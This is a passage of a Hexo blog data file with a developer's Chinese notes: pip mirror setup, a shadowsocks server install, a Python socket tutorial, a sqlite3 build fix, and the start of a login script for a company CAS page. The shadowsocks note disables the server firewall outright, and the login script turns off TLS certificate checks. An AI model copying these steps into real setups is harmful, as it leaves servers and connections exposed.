id=\"Linux-Unix\"><a href=\"#Linux-Unix\" class=\"headerlink\" title=\"Linux/Unix:\"></a>Linux/Unix:</h5><p>/etc/pip.conf</p>\n<p>~/.pip/pip.conf</p>\n<p>~/.config/pip/pip.conf</p>\n<h5 id=\"Mac-OSX\"><a href=\"#Mac-OSX\" class=\"headerlink\" title=\"Mac OSX:\"></a>Mac OSX:</h5><p>~/Library/Application Support/pip/pip.conf</p>\n<p>~/.pip/pip.conf</p>\n<p>/Library/Application Support/pip/pip.conf</p>\n<h5 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows:\"></a>Windows:</h5><p>%APPDATA%\\pip\\pip.ini</p>\n<p>%HOME%\\pip\\pip.ini</p>\n<p>C:\\Documents and Settings\\All Users\\Application Data\\PyPA\\pip\\pip.conf (Windows XP)</p>\n<p>C:\\ProgramData\\PyPA\\pip\\pip.conf (Windows 7及以后)</p>\n<h4 id=\"配置如下：\"><a href=\"#配置如下：\" class=\"headerlink\" title=\"配置如下：\"></a>配置如下：</h4><p><code>`</code><br>[global]<br>index-url = <a href=\"https://pypi.douban.com/simple\" target=\"_blank\" rel=\"noopener\">https://pypi.douban.com/simple</a> #豆瓣源，可以换成其他的源<br>trusted-host = pypi.douban.com            #添加豆瓣源为可信主机，要不然可能报错<br>disable-pip-version-check = true          #取消pip版本检查，排除每次都报最新的pip<br>timeout = 120</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"直接使用\"><a href=\"#直接使用\" class=\"headerlink\" title=\"直接使用\"></a>直接使用</h4><pre><code>pip install -i https://pypi.douban.com/simple/ 【包名】\n</code></pre><h4 id=\"pip源配置文件可以放置的位置\"><a href=\"#pip源配置文件可以放置的位置\" class=\"headerlink\" title=\"pip源配置文件可以放置的位置\"></a>pip源配置文件可以放置的位置</h4><h5 id=\"Linux-Unix\"><a href=\"#Linux-Unix\" class=\"headerlink\" title=\"Linux/Unix:\"></a>Linux/Unix:</h5><p>/etc/pip.conf</p>\n<p>~/.pip/pip.conf</p>\n<p>~/.config/pip/pip.conf</p>\n<h5 id=\"Mac-OSX\"><a href=\"#Mac-OSX\" class=\"headerlink\" title=\"Mac OSX:\"></a>Mac OSX:</h5><p>~/Library/Application Support/pip/pip.conf</p>\n<p>~/.pip/pip.conf</p>\n<p>/Library/Application Support/pip/pip.conf</p>\n<h5 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows:\"></a>Windows:</h5><p>%APPDATA%\\pip\\pip.ini</p>\n<p>%HOME%\\pip\\pip.ini</p>\n<p>C:\\Documents and Settings\\All Users\\Application Data\\PyPA\\pip\\pip.conf (Windows XP)</p>\n<p>C:\\ProgramData\\PyPA\\pip\\pip.conf (Windows 7及以后)</p>\n<h4 id=\"配置如下：\"><a href=\"#配置如下：\" class=\"headerlink\" title=\"配置如下：\"></a>配置如下：</h4><p><code>`</code><br>[global]<br>index-url = <a href=\"https://pypi.douban.com/simple\" target=\"_blank\" rel=\"noopener\">https://pypi.douban.com/simple</a> #豆瓣源，可以换成其他的源<br>trusted-host = pypi.douban.com            #添加豆瓣源为可信主机，要不然可能报错<br>disable-pip-version-check = true          #取消pip版本检查，排除每次都报最新的pip<br>timeout = 120</p>\n"},{"title":"shadowsocks","date":"2018-07-10T13:09:19.000Z","_content":"[连接](https://github.com/ziggear/shadowsocks)\n\nsystemctl stop firewalld.service #停止firewall\n\nsystemctl disable firewalld.service\n#禁止firewall开机启动\n```\nyum install python-setuptools && easy_install pip\n\npip install shadowsocks\n\nssserver -c /etc/shadowsocks.json -d start\n\n/etc/shadowsocks.json\n```\n\n```\n{\n    \"server\":\"my_server_ip\",\n    \"server_port\":8388,\n    \"local_address\": \"127.0.0.1\",\n    \"local_port\":1080,\n    \"password\":\"mypassword\",\n    \"timeout\":300,\n    \"method\":\"aes-256-cfb\",\n    \"fast_open\": false\n}\n```","source":"_posts/python/shadowsocks.md","raw":"---\ntitle: shadowsocks\ndate: 2018-07-10 21:09:19\ntags: python\n---\n[连接](https://github.com/ziggear/shadowsocks)\n\nsystemctl stop firewalld.service #停止firewall\n\nsystemctl disable firewalld.service\n#禁止firewall开机启动\n```\nyum install python-setuptools && easy_install pip\n\npip install shadowsocks\n\nssserver -c /etc/shadowsocks.json -d start\n\n/etc/shadowsocks.json\n```\n\n```\n{\n    \"server\":\"my_server_ip\",\n    \"server_port\":8388,\n    \"local_address\": \"127.0.0.1\",\n    \"local_port\":1080,\n    \"password\":\"mypassword\",\n    \"timeout\":300,\n    \"method\":\"aes-256-cfb\",\n    \"fast_open\": false\n}\n```","slug":"python/shadowsocks","published":1,"updated":"2018-07-10T13:10:09.963Z","_id":"cjjedmhbh006r0gtj7vf63crk","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"https://github.com/ziggear/shadowsocks\" target=\"_blank\" rel=\"noopener\">连接</a></p>\n<p>systemctl stop firewalld.service #停止firewall</p>\n<p>systemctl disable firewalld.service</p>\n<p>#禁止firewall开机启动<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install python-setuptools &amp;&amp; easy_install pip</span><br><span class=\"line\"></span><br><span class=\"line\">pip install shadowsocks</span><br><span class=\"line\"></span><br><span class=\"line\">ssserver -c /etc/shadowsocks.json -d start</span><br><span class=\"line\"></span><br><span class=\"line\">/etc/shadowsocks.json</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;server&quot;:&quot;my_server_ip&quot;,</span><br><span class=\"line\">    &quot;server_port&quot;:8388,</span><br><span class=\"line\">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,</span><br><span class=\"line\">    &quot;local_port&quot;:1080,</span><br><span class=\"line\">    &quot;password&quot;:&quot;mypassword&quot;,</span><br><span class=\"line\">    &quot;timeout&quot;:300,</span><br><span class=\"line\">    &quot;method&quot;:&quot;aes-256-cfb&quot;,</span><br><span class=\"line\">    &quot;fast_open&quot;: false</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<p><a href=\"https://github.com/ziggear/shadowsocks\" target=\"_blank\" rel=\"noopener\">连接</a></p>\n<p>systemctl stop firewalld.service #停止firewall</p>\n<p>systemctl disable firewalld.service</p>\n<p>#禁止firewall开机启动<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install python-setuptools &amp;&amp; easy_install pip</span><br><span class=\"line\"></span><br><span class=\"line\">pip install shadowsocks</span><br><span class=\"line\"></span><br><span class=\"line\">ssserver -c /etc/shadowsocks.json -d start</span><br><span class=\"line\"></span><br><span class=\"line\">/etc/shadowsocks.json</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;server&quot;:&quot;my_server_ip&quot;,</span><br><span class=\"line\">    &quot;server_port&quot;:8388,</span><br><span class=\"line\">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,</span><br><span class=\"line\">    &quot;local_port&quot;:1080,</span><br><span class=\"line\">    &quot;password&quot;:&quot;mypassword&quot;,</span><br><span class=\"line\">    &quot;timeout&quot;:300,</span><br><span class=\"line\">    &quot;method&quot;:&quot;aes-256-cfb&quot;,</span><br><span class=\"line\">    &quot;fast_open&quot;: false</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"shutIt库","date":"2018-07-10T13:09:19.000Z","_content":"[介绍](http://geek.csdn.net/news/detail/202105)\n\n[github主页](https://github.com/ianmiell/shutit/blob/master/README.md)\n\n[类似的库](https://pexpect.readthedocs.io/en/stable/examples.html)","source":"_posts/python/shutIt库.md","raw":"---\ntitle: shutIt库\ndate: 2018-07-10 21:09:19\ntags: python\n---\n[介绍](http://geek.csdn.net/news/detail/202105)\n\n[github主页](https://github.com/ianmiell/shutit/blob/master/README.md)\n\n[类似的库](https://pexpect.readthedocs.io/en/stable/examples.html)","slug":"python/shutIt库","published":1,"updated":"2018-07-10T13:10:09.964Z","_id":"cjjedmhbh006t0gtjdv0yx6kz","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://geek.csdn.net/news/detail/202105\" target=\"_blank\" rel=\"noopener\">介绍</a></p>\n<p><a href=\"https://github.com/ianmiell/shutit/blob/master/README.md\" target=\"_blank\" rel=\"noopener\">github主页</a></p>\n<p><a href=\"https://pexpect.readthedocs.io/en/stable/examples.html\" target=\"_blank\" rel=\"noopener\">类似的库</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://geek.csdn.net/news/detail/202105\" target=\"_blank\" rel=\"noopener\">介绍</a></p>\n<p><a href=\"https://github.com/ianmiell/shutit/blob/master/README.md\" target=\"_blank\" rel=\"noopener\">github主页</a></p>\n<p><a href=\"https://pexpect.readthedocs.io/en/stable/examples.html\" target=\"_blank\" rel=\"noopener\">类似的库</a></p>\n"},{"title":"socket编程","date":"2018-07-10T13:09:19.000Z","_content":"服务端\r\n```\r\n#!/usr/bin/python3\r\n# 文件名：server.py\r\n\r\n# 导入 socket、sys 模块\r\nimport socket\r\nimport sys\r\n\r\n# 创建 socket 对象\r\nserversocket = socket.socket(\r\n            socket.AF_INET, socket.SOCK_STREAM) \r\n\r\n# 获取本地主机名\r\nhost = socket.gethostname()\r\n\r\nport = 9999\r\n\r\n# 绑定端口\r\nserversocket.bind((host, port))\r\n\r\n# 设置最大连接数，超过后排队\r\nserversocket.listen(5)\r\n\r\nwhile True:\r\n    # 建立客户端连接\r\n    clientsocket,addr = serversocket.accept()      \r\n\r\n    print(\"连接地址: %s\" % str(addr))\r\n    \r\n    msg='欢迎访问菜鸟教程！'+ \"\\r\\n\"\r\n    clientsocket.send(msg.encode('utf-8'))\r\n    clientsocket.close()\r\n```\r\n客户端\r\n```\r\n#!/usr/bin/python3\r\n# 文件名：client.py\r\n\r\n# 导入 socket、sys 模块\r\nimport socket\r\nimport sys\r\n\r\n# 创建 socket 对象\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \r\n\r\n# 获取本地主机名\r\nhost = socket.gethostname() \r\n\r\n# 设置端口好\r\nport = 9999\r\n\r\n# 连接服务，指定主机和端口\r\ns.connect((host, port))\r\n\r\n# 接收小于 1024 字节的数据\r\nmsg = s.recv(1024)\r\n\r\ns.close()\r\n\r\nprint (msg.decode('utf-8'))\r\n```","source":"_posts/python/socket编程.md","raw":"---\ntitle: socket编程\ndate: 2018-07-10 21:09:19\ntags: python\n---\n服务端\r\n```\r\n#!/usr/bin/python3\r\n# 文件名：server.py\r\n\r\n# 导入 socket、sys 模块\r\nimport socket\r\nimport sys\r\n\r\n# 创建 socket 对象\r\nserversocket = socket.socket(\r\n            socket.AF_INET, socket.SOCK_STREAM) \r\n\r\n# 获取本地主机名\r\nhost = socket.gethostname()\r\n\r\nport = 9999\r\n\r\n# 绑定端口\r\nserversocket.bind((host, port))\r\n\r\n# 设置最大连接数，超过后排队\r\nserversocket.listen(5)\r\n\r\nwhile True:\r\n    # 建立客户端连接\r\n    clientsocket,addr = serversocket.accept()      \r\n\r\n    print(\"连接地址: %s\" % str(addr))\r\n    \r\n    msg='欢迎访问菜鸟教程！'+ \"\\r\\n\"\r\n    clientsocket.send(msg.encode('utf-8'))\r\n    clientsocket.close()\r\n```\r\n客户端\r\n```\r\n#!/usr/bin/python3\r\n# 文件名：client.py\r\n\r\n# 导入 socket、sys 模块\r\nimport socket\r\nimport sys\r\n\r\n# 创建 socket 对象\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \r\n\r\n# 获取本地主机名\r\nhost = socket.gethostname() \r\n\r\n# 设置端口好\r\nport = 9999\r\n\r\n# 连接服务，指定主机和端口\r\ns.connect((host, port))\r\n\r\n# 接收小于 1024 字节的数据\r\nmsg = s.recv(1024)\r\n\r\ns.close()\r\n\r\nprint (msg.decode('utf-8'))\r\n```","slug":"python/socket编程","published":1,"updated":"2018-07-10T13:10:09.965Z","_id":"cjjedmhbi006v0gtj2429p56i","comments":1,"layout":"post","photos":[],"link":"","content":"<p>服务端</p>\n<pre><code>#!/usr/bin/python3\n# 文件名：server.py\n\n# 导入 socket、sys 模块\nimport socket\nimport sys\n\n# 创建 socket 对象\nserversocket = socket.socket(\n            socket.AF_INET, socket.SOCK_STREAM) \n\n# 获取本地主机名\nhost = socket.gethostname()\n\nport = 9999\n\n# 绑定端口\nserversocket.bind((host, port))\n\n# 设置最大连接数，超过后排队\nserversocket.listen(5)\n\nwhile True:\n    # 建立客户端连接\n    clientsocket,addr = serversocket.accept()      \n\n    print(&quot;连接地址: %s&quot; % str(addr))\n\n    msg=&apos;欢迎访问菜鸟教程！&apos;+ &quot;\\r\\n&quot;\n    clientsocket.send(msg.encode(&apos;utf-8&apos;))\n    clientsocket.close()\n</code></pre><p>客户端</p>\n<pre><code>#!/usr/bin/python3\n# 文件名：client.py\n\n# 导入 socket、sys 模块\nimport socket\nimport sys\n\n# 创建 socket 对象\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n\n# 获取本地主机名\nhost = socket.gethostname() \n\n# 设置端口好\nport = 9999\n\n# 连接服务，指定主机和端口\ns.connect((host, port))\n\n# 接收小于 1024 字节的数据\nmsg = s.recv(1024)\n\ns.close()\n\nprint (msg.decode(&apos;utf-8&apos;))\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p>服务端</p>\n<pre><code>#!/usr/bin/python3\n# 文件名：server.py\n\n# 导入 socket、sys 模块\nimport socket\nimport sys\n\n# 创建 socket 对象\nserversocket = socket.socket(\n            socket.AF_INET, socket.SOCK_STREAM) \n\n# 获取本地主机名\nhost = socket.gethostname()\n\nport = 9999\n\n# 绑定端口\nserversocket.bind((host, port))\n\n# 设置最大连接数，超过后排队\nserversocket.listen(5)\n\nwhile True:\n    # 建立客户端连接\n    clientsocket,addr = serversocket.accept()      \n\n    print(&quot;连接地址: %s&quot; % str(addr))\n\n    msg=&apos;欢迎访问菜鸟教程！&apos;+ &quot;\\r\\n&quot;\n    clientsocket.send(msg.encode(&apos;utf-8&apos;))\n    clientsocket.close()\n</code></pre><p>客户端</p>\n<pre><code>#!/usr/bin/python3\n# 文件名：client.py\n\n# 导入 socket、sys 模块\nimport socket\nimport sys\n\n# 创建 socket 对象\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n\n# 获取本地主机名\nhost = socket.gethostname() \n\n# 设置端口好\nport = 9999\n\n# 连接服务，指定主机和端口\ns.connect((host, port))\n\n# 接收小于 1024 字节的数据\nmsg = s.recv(1024)\n\ns.close()\n\nprint (msg.decode(&apos;utf-8&apos;))\n</code></pre>"},{"title":"sqlite3报错","date":"2018-07-10T13:09:19.000Z","_content":"\r\n我自己装了python3.5，但在导入sqlite3这个包的时候出现找不到包的错误。\r\n\r\n下面给出解决方法\r\n\r\n检查自己有没有安装sqlite-devel，没有的话yum -y install sqlite-devel\r\n\r\n然后进入到Python目录，（cd python目录）\r\n\r\n然后命令行输入./configure，然后make和make  install\r\n\r\n这个时候可以输入python，进入python环境后，import sqlite3，\r\n\r\n","source":"_posts/python/sqlite3报错.md","raw":"---\ntitle: sqlite3报错\ndate: 2018-07-10 21:09:19\ntags: python\n---\n\r\n我自己装了python3.5，但在导入sqlite3这个包的时候出现找不到包的错误。\r\n\r\n下面给出解决方法\r\n\r\n检查自己有没有安装sqlite-devel，没有的话yum -y install sqlite-devel\r\n\r\n然后进入到Python目录，（cd python目录）\r\n\r\n然后命令行输入./configure，然后make和make  install\r\n\r\n这个时候可以输入python，进入python环境后，import sqlite3，\r\n\r\n","slug":"python/sqlite3报错","published":1,"updated":"2018-07-10T13:10:09.966Z","_id":"cjjedmhbj006x0gtjxdlzs37n","comments":1,"layout":"post","photos":[],"link":"","content":"<p>我自己装了python3.5，但在导入sqlite3这个包的时候出现找不到包的错误。</p>\n<p>下面给出解决方法</p>\n<p>检查自己有没有安装sqlite-devel，没有的话yum -y install sqlite-devel</p>\n<p>然后进入到Python目录，（cd python目录）</p>\n<p>然后命令行输入./configure，然后make和make  install</p>\n<p>这个时候可以输入python，进入python环境后，import sqlite3，</p>\n","site":{"data":{}},"excerpt":"","more":"<p>我自己装了python3.5，但在导入sqlite3这个包的时候出现找不到包的错误。</p>\n<p>下面给出解决方法</p>\n<p>检查自己有没有安装sqlite-devel，没有的话yum -y install sqlite-devel</p>\n<p>然后进入到Python目录，（cd python目录）</p>\n<p>然后命令行输入./configure，然后make和make  install</p>\n<p>这个时候可以输入python，进入python环境后，import sqlite3，</p>\n"},{"title":"代理","date":"2018-07-10T13:09:19.000Z","_content":"```\n#!/usr/bin/python3\n\nimport socket\nimport requests\nimport sys\n\nheader = {\n    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n    'Accept-Language': 'en-US,en;q=0.5',\n    'Accept-Encoding': 'gzip, deflate, br'\n}\n\nserversocket = socket.socket(\n    socket.AF_INET, socket.SOCK_STREAM)\n\nhost = socket.gethostname()\nport = 1234\nserversocket.bind((host, port))\nprint(host)\nserversocket.listen(5)\n\nwhile True:\n    clientsocket,addr = serversocket.accept()\n    print(\"连接地址: %s\" % str(addr))\n    user_request = clientsocket.recv(1024)\n    print(user_request)\n    msg='...............'+ \"\\r\\n\"\n    #data = requests.get(\"http://www.baidu.com\",headers=header)\n    clientsocket.send(msg.encode('utf-8'))\n    clientsocket.close()\n```\n\n```\n\nimport socket\nimport sys\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nhost = socket.gethostname()\nport = 1234\ns.connect((host, port))\ns.send(\"asdasd\".encode('utf-8'))\nmsg = s.recv(1024)\ns.close()\nprint (msg.decode('utf-8'))\n\n```","source":"_posts/python/代理.md","raw":"---\ntitle: 代理\ndate: 2018-07-10 21:09:19\ntags: python\n---\n```\n#!/usr/bin/python3\n\nimport socket\nimport requests\nimport sys\n\nheader = {\n    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n    'Accept-Language': 'en-US,en;q=0.5',\n    'Accept-Encoding': 'gzip, deflate, br'\n}\n\nserversocket = socket.socket(\n    socket.AF_INET, socket.SOCK_STREAM)\n\nhost = socket.gethostname()\nport = 1234\nserversocket.bind((host, port))\nprint(host)\nserversocket.listen(5)\n\nwhile True:\n    clientsocket,addr = serversocket.accept()\n    print(\"连接地址: %s\" % str(addr))\n    user_request = clientsocket.recv(1024)\n    print(user_request)\n    msg='...............'+ \"\\r\\n\"\n    #data = requests.get(\"http://www.baidu.com\",headers=header)\n    clientsocket.send(msg.encode('utf-8'))\n    clientsocket.close()\n```\n\n```\n\nimport socket\nimport sys\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nhost = socket.gethostname()\nport = 1234\ns.connect((host, port))\ns.send(\"asdasd\".encode('utf-8'))\nmsg = s.recv(1024)\ns.close()\nprint (msg.decode('utf-8'))\n\n```","slug":"python/代理","published":1,"updated":"2018-07-10T13:10:09.971Z","_id":"cjjedmhbk006z0gtjopdv6p2a","comments":1,"layout":"post","photos":[],"link":"","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/python3</span><br><span class=\"line\"></span><br><span class=\"line\">import socket</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import sys</span><br><span class=\"line\"></span><br><span class=\"line\">header = &#123;</span><br><span class=\"line\">    &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0&apos;,</span><br><span class=\"line\">    &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,</span><br><span class=\"line\">    &apos;Accept-Language&apos;: &apos;en-US,en;q=0.5&apos;,</span><br><span class=\"line\">    &apos;Accept-Encoding&apos;: &apos;gzip, deflate, br&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">serversocket = socket.socket(</span><br><span class=\"line\">    socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\"></span><br><span class=\"line\">host = socket.gethostname()</span><br><span class=\"line\">port = 1234</span><br><span class=\"line\">serversocket.bind((host, port))</span><br><span class=\"line\">print(host)</span><br><span class=\"line\">serversocket.listen(5)</span><br><span class=\"line\"></span><br><span class=\"line\">while True:</span><br><span class=\"line\">    clientsocket,addr = serversocket.accept()</span><br><span class=\"line\">    print(&quot;连接地址: %s&quot; % str(addr))</span><br><span class=\"line\">    user_request = clientsocket.recv(1024)</span><br><span class=\"line\">    print(user_request)</span><br><span class=\"line\">    msg=&apos;...............&apos;+ &quot;\\r\\n&quot;</span><br><span class=\"line\">    #data = requests.get(&quot;http://www.baidu.com&quot;,headers=header)</span><br><span class=\"line\">    clientsocket.send(msg.encode(&apos;utf-8&apos;))</span><br><span class=\"line\">    clientsocket.close()</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">import socket</span><br><span class=\"line\">import sys</span><br><span class=\"line\">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">host = socket.gethostname()</span><br><span class=\"line\">port = 1234</span><br><span class=\"line\">s.connect((host, port))</span><br><span class=\"line\">s.send(&quot;asdasd&quot;.encode(&apos;utf-8&apos;))</span><br><span class=\"line\">msg = s.recv(1024)</span><br><span class=\"line\">s.close()</span><br><span class=\"line\">print (msg.decode(&apos;utf-8&apos;))</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/python3</span><br><span class=\"line\"></span><br><span class=\"line\">import socket</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import sys</span><br><span class=\"line\"></span><br><span class=\"line\">header = &#123;</span><br><span class=\"line\">    &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0&apos;,</span><br><span class=\"line\">    &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,</span><br><span class=\"line\">    &apos;Accept-Language&apos;: &apos;en-US,en;q=0.5&apos;,</span><br><span class=\"line\">    &apos;Accept-Encoding&apos;: &apos;gzip, deflate, br&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">serversocket = socket.socket(</span><br><span class=\"line\">    socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\"></span><br><span class=\"line\">host = socket.gethostname()</span><br><span class=\"line\">port = 1234</span><br><span class=\"line\">serversocket.bind((host, port))</span><br><span class=\"line\">print(host)</span><br><span class=\"line\">serversocket.listen(5)</span><br><span class=\"line\"></span><br><span class=\"line\">while True:</span><br><span class=\"line\">    clientsocket,addr = serversocket.accept()</span><br><span class=\"line\">    print(&quot;连接地址: %s&quot; % str(addr))</span><br><span class=\"line\">    user_request = clientsocket.recv(1024)</span><br><span class=\"line\">    print(user_request)</span><br><span class=\"line\">    msg=&apos;...............&apos;+ &quot;\\r\\n&quot;</span><br><span class=\"line\">    #data = requests.get(&quot;http://www.baidu.com&quot;,headers=header)</span><br><span class=\"line\">    clientsocket.send(msg.encode(&apos;utf-8&apos;))</span><br><span class=\"line\">    clientsocket.close()</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">import socket</span><br><span class=\"line\">import sys</span><br><span class=\"line\">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">host = socket.gethostname()</span><br><span class=\"line\">port = 1234</span><br><span class=\"line\">s.connect((host, port))</span><br><span class=\"line\">s.send(&quot;asdasd&quot;.encode(&apos;utf-8&apos;))</span><br><span class=\"line\">msg = s.recv(1024)</span><br><span class=\"line\">s.close()</span><br><span class=\"line\">print (msg.decode(&apos;utf-8&apos;))</span><br></pre></td></tr></table></figure>"},{"title":"work","date":"2018-07-10T13:09:19.000Z","_content":"```\r\n# -*- coding:utf-8 -*-\r\nimport requests\r\nimport re\r\nimport random\r\n\r\nheader_login = {\r\n    'Host': 'hs-cas.hundsun.com',\r\n    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',\r\n    'Upgrade-Insecure-Requests': '1',\r\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\r\n    'Accept-Language': 'en-US,en;q=0.5',\r\n    'Accept-Encoding': 'gzip, deflate, sdch',\r\n    'Connection': 'keep-alive',\r\n    'Cache-Control': 'max-age=0'\r\n}\r\n\r\nheader_info = {\r\n    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',\r\n    'Upgrade-Insecure-Requests': '1',\r\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\r\n    'Accept-Language': 'en-US,en;q=0.5',\r\n    'Accept-Encoding': 'gzip, deflate, sdch',\r\n    'Referer': '127.0.0.1:8888',\r\n    'Connection': 'keep-alive',\r\n    'Cache-Control': 'max-age=0'\r\n}\r\n\r\nlogin_url = 'https://hs-cas.hundsun.com/cas/login?service=http%3A%2F%2Fpm.hundsun.com%3A80%2Fj_acegi_cas_security_check'\r\ns = requests.Session()\r\n# html = s.get(login_url, headers=header)\r\n\r\nhtml = s.get(login_url, headers=header_login, verify=False)\r\n# print(html)\r\nprint('结果：', html.status_code)\r\nprint('原因：', html.reason)\r\n\r\nrule1 = 